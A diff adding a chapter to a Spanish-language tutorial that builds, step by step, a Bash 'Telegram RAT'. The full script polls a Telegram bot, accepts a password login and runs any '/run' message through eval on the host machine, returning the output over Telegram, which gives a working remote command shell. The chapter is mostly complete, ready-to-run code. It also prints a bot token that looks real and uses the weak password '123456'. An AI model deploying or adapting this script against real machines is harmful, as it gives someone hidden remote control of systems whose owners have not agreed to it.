@@ -2954,6 +2954,656 @@ _Estos bots están todos operativos y son accesibles gratuitamente en el momento
 
 ## Capítulo 24: Telegram RAT
 
+### Qué es un RAT?
+RAT puede hacer referencia a 2 acrónimos en inglés:  
+1. Remote Access Tool  
+2. Remote Acesss Trojan  
+  
+Una Remote Access Tool (Herramienta de Acceso Remoto) es un programa informático que permite a un usuario acceder/controlar un dispositivo remoto. Son herramientas creadas para permitir administrar o dar soporte a sistemas sin tener accesso físico a ellos.
+
+Un Remote Access Trojan (Troyano de Acceso Remoto) es un tipo de software malicioso que se oculta en un programa aparentemente legítimo y permite a un atacante acceder y controlar un dispositivo remoto de manera no autorizada. Estos troyanos son utilizados con fines maliciosos, permitiendo a los ciberdelincuentes acceder y controlar dispositivos a distancia sin el conocimiento del usuario. Es decir es una herramienta de acceso remoto a la que se le han incluido funcionalidades que permitan su uso malicioso, como pueden ser la elevación de privilegios, polymorfismo, exfiltración de datos, invisibilidad, persistencia, etc.    
+
+Si te suena el término botnet, normalmente las botnets son un montón de sistemas infectados por un RAT que pueden ser controlados simultaneamente. 
+
+### Requisitos
+- Cuenta de Telegram
+- Bash
+- jq
+- curl
+
+### Creando el RAT
+En el [Capítulo 5: Introducción a Bash](#cap%C3%ADtulo-5-introducci%C3%B3n -a-bash) aprendimos un poco sobre el lenguaje Bash, asique será el que vamos a utilizar para crear el bot.  
+
+Antes de programar algo, sobre todo si somos inexpertos, es importante definir la lógica y las funcionalidades que queremos que tenga nuestro programa. Para hacer esto podemos usar pseudocódigo o bien el propio idioma español. Esto nos permitirá definir una idea clara de como y que será el programa.  
+
+Podemos primero hacer un listado de las funcionalidades:  
+- Leer los mensajes de una cuenta Bot de Telegram  
+- Borrar los mensajes de la cuenta Bot de Telegram    
+- Enviar mensajes a la cuenta de Telegram  
+- Sistema de login  
+- Usuarios logeados pueden correr comandos en el sistema  
+- Usuarios no logeados pueden correr comandos como /help o /login  
+  
+Una vez tenemos la lista de lo que queremos que haga el programa, podemos escribir como serìa el código en español en un lenguaje inventado:
+
+```
+-comentario- VariablesGlobales:
+crear lista usuariosLogeados
+
+-comentario- Funciones:
+funcion LeerMensajes
+  mensajes = solicitarMensajes a telegram
+  retornar mensajes
+
+funcion BorrarMensajes
+  solicitarBorradoDeMensajes a telegram
+
+funcion EnviarMensaje mensaje_del_bot usuario_x
+  enviarMensaje mensaje_del_bot al usuario_x de telegram
+
+funcion Login usuario_x contrasena_x
+  si usuario_x está en la lista
+    retornar VERDADERO
+
+funcion CorrerComandosEnSistema usuario_x comando_a_correr
+  si (ComprobarSiUsuarioEnLista usuario_x) igual a VERDADERO
+    respuestaDelComando = ejecutar comando_a_correr
+    retornar respuestaDelComando
+
+
+-comentario- Código principal:
+bucleInfinito:
+  mensaje = LeerMensajes
+
+  si mensaje tiene /login
+    si login usuario_x contrasena_x igual a VERDADERO
+       Añadir usuario_x a la lista de usuariosLogeados
+
+  si mensaje tiene hola
+    EnviarMensaje "Hola soy el RAT" usuario_x
+
+  si mensaje tiene /ejecutar_comando
+    si (ComprobarSiUsuarioEnLista usuario_x) igual a VERDADERO
+      respuestaDelComando = ejecutar comando_a_correr
+      EnviarMensaje respuestaDelComando usuario_x
+
+  BorrarMensajes
+  Esperar 5 segundos
+
+```  
+  
+Como puedes observar el código es bastante sencillo. Esto es lo que sería la lógica principal del programa. Obviamente se omiten pequeños detalles como manejo de errores, obtener el nombre del usuario de los mensajes, etc. Ya que el objetivo de hacer este pseudocódigo es definir la lógica principal/estructura que queremos que tenga nuestro programa.   
+
+El siguiente paso es escribir este mismo código pero en un lenguaje real. En nuestro caso Bash, pero se puede utilizar cualquier otro.  
+
+##### Creando el bot de Telegram  
+Para poder interactuar con Telegram, lo primero será crear un bot de telegram que guardará los mensajes que le mandemos, y así nosotros podremos acceder a ellos desde el RAT. Como ya vimos en los requisitos necesitamos tener una cuenta de Telegram para poder crear bots. Una vez tienes una cuenta puedes crear un bot en la siguiente url: [https://t.me/BotFather](https://t.me/BotFather), si estás en Android con hacer click ya te abre el chat con BotFather para poder crear tu bot.  
+  
+Una vez dentro del chat de tg con BotFather le escribirás el comando /newbot para iniciar la creación de un nuevo bot. Te pedirá que escribas el nombre del bot. Puedes ponerle por ejemplo: RAT_De_TuNombre  
+  
+Tras enviarle el nombre de tu bot, te dirá que necesita un nombre de uusuario para la cuenta del bot. Es decir, te está pidiendo el @ del bot. Una de las condiciones de las cuentas de bots es que su nolbre de cuenta debe terminar por la palabra bot. Asique puede llamarlo RAT_De_TuNombre_Bot en mi caso sería RAT_De_Manolo_Bot  
+  
+Si el nombre es válido, verás un mensaje como:
+```
+Done! Congratulations on your new bot. You will find it at t.me/RAT_De_Manolo_Bot. You can now add a description, about section and profile picture for your bot, see /help for a list of commands. By the way, when you've finished creating your cool bot, ping our Bot Support if you want a better username for it. Just make sure the bot is fully operational before you do this.
+
+Use this token to access the HTTP API:
+5863933391:HBGUBfzdfpp0QtZVSvGaWUMbWvJi7dWLJK9
+Keep your token secure and store it safely, it can be used by anyone to control your bot.
+
+For a description of the Bot API, see this page: https://core.telegram.org/bots/api
+```
+
+En este mensaje se incluye una url para poder hablar con el bot y un token que debes poner en las peticiones que hagas al bot, por ejemplo para obtener los mensajes que le enviaron al bot.  
+*IMPORTANTE*: _Este token no debes compartirlo con nadie, ya que se puede utilizar para controlar el bot y por tanto si lo tienes funcionando en tu sistema o en otro, un desconocido que tenga tu token del bot podría también controlar el sistema sin que tu lo sepas._
+
+Podemos probar que todo funciona correctamente con un comando de curl. Abre un chat con el bot usando el enlace que te dio BotFather y envíale el mensaje Hola!  
+  
+Utiliza el siguiente comando para solicitar los mensajes del bot con curl:
+```bash
+curl 'https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates'
+
+```
+
+Obviamente remplaza YOUR_BOT_TOKEN por el token de tu bot. En mi caso sería: 
+```bash
+curl 'https://api.telegram.org/bot5863933391:HBGUBfzdfpp0QtZVSvGaWUMbWvJi7dWLJK9/getUpdates'
+```
+
+*NOTA*: _/getUpdates así como otros endpoints de la API de Telegram Bot están publicadas en la web de telegram. [Bot API](https://core.telegram.org/bots/api). Si bajas por la web verás el getUpdates que estoy utilizando, asi como otros que están disposibles_  
+
+Si todo está correcto, verás una respuesta similar a:
+```json
+{"ok":true,"result":[{"update_id":241851273,
+"message":{"message_id":1,"from":{"id":827150271,"is_bot":false,"first_name":"StringManolo","username":"StringManolo","language_code":"es"},"chat":{"id":167170617,"first_name":"StringManolo","username":"StringManolo","type":"private"},"date":1662723616,"text":"Hola"}}]}
+```
+  
+Este formato se conoce como JSON y es bastante utilizado por muchos servicios. Con el comando *jq* podremos extraer exactamente lo que necesitemos de la respuesta del bot. Por ejemplo si queremos obtener solo el mensaje:
+```bash
+curl -s curl 'https://api.telegram.org/bot5863933391:HBGUBfzdfpp0QtZVSvGaWUMbWvJi7dWLJK9/getUpdates' | jq .result[0].message.text
+```  
+
+Veremos como resultado el mensaje 'Hola' que le escribimos al bot en el chat. La sintaxis de jq es sencilla de entender, los puntos son oara acceder a porpiedades (es decir los nombres) y los corchetes son para acceder al mensaje en concreto. Por ejemplo con [0] accedemos al primer mensaje, con [1] accedemos al segundo, con [9] accedemos al décimo, etc. En este caso solo tenemos el de Hola, pero si le envias mas cosas al chat del bot, tendrás mas.  
+  
+Si espaciamos el JSON podemos ver mejor su estructura visualmente:  
+```json
+{
+  "ok": true,
+  "result": [
+    {
+      "update_id": 241851273,
+      "message": {
+        "message_id": 1,
+        "from": {
+          "id": 827150271,
+          "is_bot": false,
+          "first_name": "StringManolo",
+          "username": "StringManolo",
+          "language_code": "es"
+        },
+        "chat": {
+          "id": 167170617,
+          "first_name": "StringManolo",
+          "username": "StringManolo",
+          "type": "private"
+        },
+        "date": 1662723616,
+        "text": "Hola"
+      }
+    },
+
+    {
+      "update_id": 241851274,
+      "message": {
+        "message_id": 2,
+        "from": {
+          "id": 827150271,
+          "is_bot": false,
+          "first_name": "StringManolo",
+          "username": "StringManolo",
+          "language_code": "es"
+        },
+        "chat": {
+          "id": 167170617,
+          "first_name": "StringManolo",
+          "username": "StringManolo",
+          "type": "private"
+        },
+        "date": 1662723640,
+        "text": "Otro Mensaje"
+      }
+    }
+  ]
+}
+```
+
+Le añadí otro mensaje para que veas como queda.  
+
+
+Pues ahora que ya vemos mas o menos como funciona, lo que haremos es usar Bash obtener estos mensajes programáticamente, analizarlos y tomar decisiones en base al texto que recibamos, por ejemplo si recivimos el mensaje /saluda podremos obtener el nombre del usuario que nos envió ese mensaje, el id del chat y enviarle un mensaje tal que 'Hola Manolo' al mismo chat que nos envió el mensaje /saluda. Con esta sencilla técnica si detectamos el mensaje '/run ls' podremos ejecutar el comando ls usando Bash y enviarle al chat del usuario la respuesta del comando ls. Así de esta forma es como tener una terminal remota, ya que todos los comandos que le ponemos en el chat de telegram nuestro programa en bash los ejecutará y nos enviará la respuesta.  
+  
+Pues procedamos a implementar en bash nuestra primera función LeerMensajes que hicimos en pseudocódugo en español. _Para programar usaré VIM como editor de texto. Si no lo manejas puedes revisar el [Capítulo 6: Uso de VI y de VIM](#cap%C3%ADtulo-6-uso-de-vi-y-de-vim) o puedes utilizar cualquier otro editor de texto. _
+
+Crearé el archivo llamado rat.sh con el siguiente comando:
+```bash
+vim rat.sh
+```
+
+##### Y dentro del archivo haremos la función LeerMensajes:
+```bash
+TOKEN='5863933391:HBGUBfzdfpp0QtZVSvGaWUMbWvJi7dWLJK9';
+
+LeerMensajes() {
+  local -n referenciaMensajes=$2;
+  local comando='curl '"'"'https://api.telegram.org/bot';
+  comando+=$1; # $TOKEN
+  comando+='/getUpdates'"'"' --silent';
+  referenciaMensajes=$(eval $comando);
+}
+
+LeerMensajes $TOKEN mensajes;
+echo $mensajes
+```
+
+Explicación del código:  
+- Utilizo una variable para almacenar el token, ya que si lo metes directamente en el url y en el futuro utilizas otro bot, o cambias el token de tu bot tendrìas que cambiarlo de todas las urls. En cambio usando la variable TOKEN tan solo hay que cambiarle el token ahí.
+- Obtengo una referencia local a la segunda variable que se pase en la llamda a la función (es una técnica para poder rellenar la variable mensajes con lo que queramos)
+- Creo un texto tal que curl 'https://.....' despues le añado el TOKEN, después el resto de la url.  
+- Evaluo el texto para ejecutarlo como comando.  
+- Le asigno a mensajes la respuesta del comando (el JSON).  
+- Añadí también un código de ejemplo de como se utiliza la función para guardar el JSON en una variable y lo imprimo en consola.  
+  
+Si sales del editor y ejecutas el código con el comando:
+```bash
+bash rat.sh
+```
+
+Verás la misma salida que obteníamos al correr el comando curl en consola solicitando los mensajes. Es decir, la función lo único que hace es guardar en una variable $mensajes la respuesta del comando curl.  
+  
+##### Para la función BorrarMensajes haremos lo mismo:
+```bash
+ultimoId=0;
+
+BorrarMensajes() {
+  local -n referenciaMensajes=$2;
+  local comando='curl '"'"'https://api.telegram.org/bot';
+  comando+=$1; # $TOKEN
+  comando+='/getUpdates?offset=';
+  comando+=$(($ultimoId));
+  comando+=''"'"' --silent';
+  referenciaMensajes=$(eval $comando);
+}
+```
+
+Explicación del código:
+- El código es prácticamente igual que la función LeerMensajes
+- Cambiamos el método del endpoint a /getUpdates?offset=$ultimoId    
+Por el resto es lo mismo. Esto lo explican en la documentación de Telegram Bot API. Al pasarle el id de update del JSON se borran automáticamente los mensajes anteriores. El id de update lo veras en el json, en este caso la variable ultimoId es una variable global como TOKEN que modificaremos mas adelante.  
+  
+##### La siguiente función es la de EnviarMensaje:  
+```bash
+# Codifica comillas, guiones, barra invertida y otros caracteres especiales
+CodificarMensaje() {
+  local cadena="${1}";
+  local tamanhoCadena=${#cadena};
+  local codificado="";
+  local pos c o;
+
+  for (( pos=0 ; pos<tamanhoCadena ; pos++ )); do
+     c=${cadena:$pos:1}
+     case "$c" in
+       [-_.~a-zA-Z0-9] ) o="${c}" ;;
+        * )
+       printf -v o '%%%02x' "'$c"
+     esac
+     codificado+="${o}";
+  done
+  globalCodificado=$(echo "${codificado}");
+}
+
+
+EnviarMensaje() {
+  local -n referenciaResultado=$3;
+  local respuesta=$1;
+  local idChat=$2;
+  # Si la respuesta es mas grande que la permitida por telegram, se envia en trozos de 4000 caracteres
+  if [[ ${#respuesta} -gt 4000 ]]; then
+    local comando='curl '"'"'https://api.telegram.org/bot';
+    comando+=$TOKEN;
+    comando+='/sendMessage?chat_id=';
+    comando+=$chatId;
+    comando+='&text=';
+    comando+='Respuesta En Trozos:';
+    comando+=''"'"' --silent';
+
+    # Envía el mensaje "Respuesta En Trozos:" indicando que la respiesta se enviará en múltiples mensajes
+    referenciaResultado=$(eval $comando);
+    # Envía los mensajes en trozos de 4.000 caracteres
+    for ((i=0; i<${#respuesta}; i+=4000)) do
+       local comando2='curl '"'"'https://api.telegram.org/bot';
+       comando2+=$TOKEN;
+       comando2+='/sendMessage?chat_id=';
+       comando2+=$idChat;
+       comando2+='&text=';
+       globalCodificado="";
+       CodificarMensaje "${respuesta:$i:4000}";
+       comando2+="$globalCodificado";
+       comando2+=''"'"' --silent';
+       referenciaResultado=$(eval $comando2);
+    done
+  else
+    local comando='curl '"'"'https://api.telegram.org/bot';
+    comando+=$TOKEN;
+    comando+='/sendMessage?chat_id=';
+    comando+=$idChat;
+    comando+='&text=';
+    globalCodificado="";
+    CodificarMensaje "$respuesta";
+    comando+="$globalCodificado";
+    comando+=''"'"' --silent';
+    referenciaResultado=$(eval $comando);
+  fi
+}
+```
+  
+Explicación del código:  
+- Esta función es prácticamnete igual a las otras 2 pero es un poco más larga porque contiene una solución para casos en los que el mensaje de consola es demasiado largo como para enviarlo directamente en un solo mensaje de Telegram. Ya el tamaño máximo de un mensaje de telegram es unos 4.000 caracteres.
+- También al enviar el mensaje con curl y utlizando una url es necesario escapar ciertos caracteres, y por eso se incluye la función CodificarMensaje.
+
+##### Ahora la función de Login:
+```bash
+usuariosLogeados=();
+
+# Comprueba si el @usuario se ha logeado (Usando el comando /login contrasenha)
+Login() {
+  local -n referenciaResultado=$2;
+  local usuario=$1;
+  for ((i=0; i < ${#usuariosLogeados}; i++)) do
+    if [[ $usuario = ${usuariosLogeados[$i]} ]]; then
+      referenciaResultado="true";
+      return;
+    fi
+  done
+  referenciaResultado="false";
+}
+```
+
+Explicacion del código:  
+- En esta función recorremos la lista de usuariosLogeados para comprobar si el @usuario se encuentra en ella. De momento la lista está vacia, la llenaremos mas adelante cuando el usuario mande el mensaje '/login contraseña' siendo contraseña una variable global que contenga una contraseña que tu quieras usar para el login.
+
+##### La función para correr comandos podría quedar tal que:
+```bash
+CONTRASENHA='123456';
+
+# Esta función comprueba si se ha detectado algún comando y define que hacer cuando se detecta el comando
+CorrerComando() {
+  local -n referenciaResultado=$4;
+  local texto=$1;
+  local usuario=$2;
+  local idChat=$3;
+
+  printf '%s me envió %s usando el chat n°%s\n' "$usuario" "$texto" "$idChat";
+
+  # Haz loggin del usuario
+  local aux='/login ';
+  aux+="$CONTRASENHA";
+
+  # Comprueba si el mensaje del usario es igual a /login $CONTRASENHA
+  if [[ "$texto" = "\"$aux\"" ]]; then
+    usuariosLogeados+=($usuario);
+    local aux2="$usuario";
+    aux2+=' ha ingresado';
+    EnviarMensaje "$aux2" "$idChat" dummy;
+  fi
+
+  # Los comandos /start y hola están aquí como ejemplo de como se crean comandos
+  if [[ ${texto:1:4} = 'hola' || ${texto:1:6} = '/start' ]]; then
+    echo "/start o hola encontrados!";
+    local aux3='Hola ';
+    aux3+=$usuario;
+    aux3+=', como estas?';
+
+    EnviarMensaje "$aux3" "$idChat" dummy
+  fi
+
+  local haIngreaado;
+  Login "$usuario" haIngreaado;
+  if [[ $haIngreaado = 'true' ]]; then
+    if [[ ${texto:1:4} = '/run' ]]; then
+      tamanhoComando=${#texto};
+      tamanhoComando=$(($tamanhoComando - 7));
+      salida="$(eval ${texto:6:$tamanhoComando})";
+      if [[ -z $salida ]]; then
+        EnviarMensaje 'El comando no genero ningun texto en la terminal' "$idChat" dummy
+      else
+        EnviarMensaje "$salida" "$idChat" dummy
+      fi
+    fi
+  fi
+}
+```
+  
+Explicación del código:  
+- Aquí creamos una global CONTRASEÑA para compararla con la que ponga el usuario tras el comando /login. Si coinciden le añadismos a la lista de usaurios logeados.
+- Definimos un comando /start y un texto hola a los que el bot siempre responderá. Aquí podrías añadir los comando típicos como /help o /ayuda para que el bot indique a cualquier usuario como se utiliza, etc.  
+- Definimos el comando /login para que los usuarios puedan obtener privilegios.  
+- Definimos el comando /run que solo lo podrán usar usuarios loggeados y que nos sirve para correr comandos en la máquina que está corriendo el código. Creando así una terminal remota. Haciendo esta comprobaciin podemos hacer login en el bot en un chat privado, meter el bot en un chat público y correr comandos sobre él sin que los demás usuarios del chat público puedan hacerlo al no saber ellos la contraseña de login.  
+
+##### Ahora solo nos falta la lógica principal:
+```bash
+# Logica del Bot (bucle principal)
+while [ true ]; do
+  LeerMensajes $TOKEN nuevosMensajes;
+  if [[ -z $nuevosMensajes ]]; then
+    echo 'No ha sido posible obtener los mensajes de Telegram';
+    exit;
+  fi
+
+  if [[ ! $(echo $nuevosMensajes | jq .ok) = true ]]; then
+    echo 'La API de Telegram ha fallado';
+    exit;
+  fi
+
+  mensajes=$(echo $nuevosMensajes | jq .result);
+  if [[ -z $mensajes ]]; then
+    echo 'No hay mensajes con los que trabajar';
+    exit;
+  fi
+
+  numeroDeMensajes=$(echo $mensajes | jq '. | length');
+  for ((m=1; m<$numeroDeMensajes; m++)) do
+    texto='NULL'
+    texto=$(echo $mensajes | jq .[$m].message.text);
+    usuario='NULL';
+    usuario=$(echo $mensajes | jq .[$m].message.from.username);
+    idChat=0;
+    idChat=$(echo $mensajes | jq .[$m].message.chat.id);
+    ultimoId=$(echo $mensajes | jq .[$m].update_id);
+    if [[ $texto != 'NULL' && $usuario != 'NULL' && $idChat -ne 0 ]]; then
+      CorrerComando "$texto" "$usuario" "$idChat" dummy;
+    fi
+  done
+
+  BorrarMensajes "$TOKEN" dummy;
+  sleep 5s;
+done
+```
+  
+Explicación de código:
+- Hacemos un bucle infinito para que el bot esté todo el rato compribando si le llegan mensajes nuevos y ejecutándolos cuando corresponda.  
+- Hacemos algunas comprobaciones para detectar errores.  
+- Extraemos la información necesaria, como el nombre del usuario, a que chat le responderemos y los mensajes que nos manda.  
+- Le ponemos el id de actualización a la variable ultimoId para que se borren los mensajes tras procesarlos.  
+- Recorremos todos los mensajes y ejecutamos la función CorrerComando para ejecutar los comandos que le llegan en cada uno de los mensajes.   
+- Por último borramos los mensajes y esperamos 5 segundos antes de volver a revisar si hay mensajes nuevos y repetir todo el ciclo.
+
+
+##### El código al completo de rat.sh queda tal que:
+```bash
+TOKEN='5863933391:HBGUBfzdfpp0QtZVSvGaWUMbWvJi7dWLJK9';
+ultimoId=0;
+globalCodificado="";
+usuariosLogeados=();
+CONTRASENHA='123456';
+
+LeerMensajes() {
+  local -n referenciaMensajes=$2;
+  local comando='curl '"'"'https://api.telegram.org/bot';
+  comando+=$1; # $TOKEN
+  comando+='/getUpdates'"'"' --silent';
+  referenciaMensajes=$(eval $comando);
+}
+
+BorrarMensajes() {
+  local -n referenciaMensajes=$2;
+  local comando='curl '"'"'https://api.telegram.org/bot';
+  comando+=$1; # $TOKEN
+  comando+='/getUpdates?offset=';
+  comando+=$(($ultimoId));
+  comando+=''"'"' --silent';
+  referenciaMensajes=$(eval $comando);
+}
+
+
+# Codifica comillas, guiones, barra invertida y otros caracteres especiales
+CodificarMensaje() {
+  local cadena="${1}";
+  local tamanhoCadena=${#cadena};
+  local codificado="";
+  local pos c o;
+
+  for (( pos=0 ; pos<tamanhoCadena ; pos++ )); do
+     c=${cadena:$pos:1}
+     case "$c" in
+       [-_.~a-zA-Z0-9] ) o="${c}" ;;
+        * )
+       printf -v o '%%%02x' "'$c"
+     esac
+     codificado+="${o}";
+  done
+  globalCodificado=$(echo "${codificado}");
+}
+
+
+EnviarMensaje() {
+  local -n referenciaResultado=$3;
+  local respuesta=$1;
+  local idChat=$2;
+  # Si la respuesta es mas grande que la permitida por telegram, se envia en trozos de 4000 caracteres
+  if [[ ${#respuesta} -gt 4000 ]]; then
+    local comando='curl '"'"'https://api.telegram.org/bot';
+    comando+=$TOKEN;
+    comando+='/sendMessage?chat_id=';
+    comando+=$chatId;
+    comando+='&text=';
+    comando+='Respuesta En Trozos:';
+    comando+=''"'"' --silent';
+
+    # Envía el mensaje "Respuesta En Trozos:" indicando que la respiesta se enviará en múltiples mensajes
+    referenciaResultado=$(eval $comando);
+    # Envía los mensajes en trozos de 4.000 caracteres
+    for ((i=0; i<${#respuesta}; i+=4000)) do
+       local comando2='curl '"'"'https://api.telegram.org/bot';
+       comando2+=$TOKEN;
+       comando2+='/sendMessage?chat_id=';
+       comando2+=$idChat;
+       comando2+='&text=';
+       globalCodificado="";
+       CodificarMensaje "${respuesta:$i:4000}";
+       comando2+="$globalCodificado";
+       comando2+=''"'"' --silent';
+       referenciaResultado=$(eval $comando2);
+    done
+  else
+    local comando='curl '"'"'https://api.telegram.org/bot';
+    comando+=$TOKEN;
+    comando+='/sendMessage?chat_id=';
+    comando+=$idChat;
+    comando+='&text=';
+    globalCodificado="";
+    CodificarMensaje "$respuesta";
+    comando+="$globalCodificado";
+    comando+=''"'"' --silent';
+    referenciaResultado=$(eval $comando);
+  fi
+}
+
+
+# Comprueba si el @usuario se ha logeado (Usando el comando /login contrasenha)
+Login() {
+  local -n referenciaResultado=$2;
+  local usuario=$1;
+  for ((i=0; i < ${#usuariosLogeados}; i++)) do
+    if [[ $usuario = ${usuariosLogeados[$i]} ]]; then
+      referenciaResultado="true";
+      return;
+    fi
+  done
+  referenciaResultado="false";
+}
+
+
+
+# Esta función comprueba si se ha detectado algún comando y define que hacer cuando se detecta el comando
+CorrerComando() {
+  local -n referenciaResultado=$4;
+  local texto=$1;
+  local usuario=$2;
+  local idChat=$3;
+
+  printf '%s me envió %s usando el chat n°%s\n' "$usuario" "$texto" "$idChat";
+
+  # Haz loggin del usuario
+  local aux='/login ';
+  aux+="$CONTRASENHA";
+
+  # Comprueba si el mensaje del usario es igual a /login $CONTRASENHA
+  if [[ "$texto" = "\"$aux\"" ]]; then
+    usuariosLogeados+=($usuario);
+    local aux2="$usuario";
+    aux2+=' ha ingresado';
+    EnviarMensaje "$aux2" "$idChat" dummy;
+  fi
+
+  # Los comandos /start y hola están aquí como ejemplo de como se crean comandos
+  if [[ ${texto:1:4} = 'hola' || ${texto:1:6} = '/start' ]]; then
+    echo "/start o hola encontrados!";
+    local aux3='Hola ';
+    aux3+=$usuario;
+    aux3+=', como estas?';
+
+    EnviarMensaje "$aux3" "$idChat" dummy
+  fi
+
+  local haIngreaado;
+  Login "$usuario" haIngreaado;
+  if [[ $haIngreaado = 'true' ]]; then
+    if [[ ${texto:1:4} = '/run' ]]; then
+      tamanhoComando=${#texto};
+      tamanhoComando=$(($tamanhoComando - 7));
+      salida="$(eval ${texto:6:$tamanhoComando})";
+      if [[ -z $salida ]]; then
+        EnviarMensaje 'El comando no genero ningun texto en la terminal' "$idChat" dummy
+      else
+        EnviarMensaje "$salida" "$idChat" dummy
+      fi
+    fi
+  fi
+}
+
+
+# Logica del Bot (bucle principal)
+while [ true ]; do
+  LeerMensajes $TOKEN nuevosMensajes;
+  if [[ -z $nuevosMensajes ]]; then
+    echo 'No ha sido posible obtener los mensajes de Telegram';
+    exit;
+  fi
+
+  if [[ ! $(echo $nuevosMensajes | jq .ok) = true ]]; then
+    echo 'La API de Telegram ha fallado';
+    exit;
+  fi
+
+  mensajes=$(echo $nuevosMensajes | jq .result);
+  if [[ -z $mensajes ]]; then
+    echo 'No hay mensajes con los que trabajar';
+    exit;
+  fi
+
+  numeroDeMensajes=$(echo $mensajes | jq '. | length');
+  for ((m=1; m<$numeroDeMensajes; m++)) do
+    texto='NULL'
+    texto=$(echo $mensajes | jq .[$m].message.text);
+    usuario='NULL';
+    usuario=$(echo $mensajes | jq .[$m].message.from.username);
+    idChat=0;
+    idChat=$(echo $mensajes | jq .[$m].message.chat.id);
+    ultimoId=$(echo $mensajes | jq .[$m].update_id);
+    if [[ $texto != 'NULL' && $usuario != 'NULL' && $idChat -ne 0 ]]; then
+      CorrerComando "$texto" "$usuario" "$idChat" dummy;
+    fi
+  done
+
+  BorrarMensajes "$TOKEN" dummy;
+  sleep 5s;
+done
+```
+  
+*RECUERDA*: _Para ejecutarlo necesitas poner el token de tu bot de Telegram, poner una contraseña, tener una cuenta de usuario con el @nombre (para que el bot te meta a la lista de usuarios logeados). También necesitas instalar *bash*, *curl* y *jq* en el sistema que va a correr el bot_
+  
+Para ejecutarlo simplemente usa el comando:
+```bash
+bash rat.sh 
+```
+
+*NOTA*: _La versión en inglés, que es una versión mas completa y actualizada de este programa se encuentra en [https://github.com/stringmanolo/tgbot.sh](ps://github.com/stringmanolo/tgbot.sh), esa versión carga el token y la contraseña de archivos llamados token.txt y password.txt que se encuentren en la misma carpeta que el programa. En el repositorio se encuentras las instrucciones, que son prácticamente idénticas que estas._
+
+Aquí tienes un video de la versión en inglés del bot en funcionamiento:  
+[![Videoturorial image preview](https://raw.githubusercontent.com/StringManolo/tgbot.sh/master/images/tgbotshvideopreview.jpg)](https://youtu.be/-_QyXqj41-Q)
+
+
+
 [Tabla de Contenidos](#tabla-de-contenidos)
 
 ----
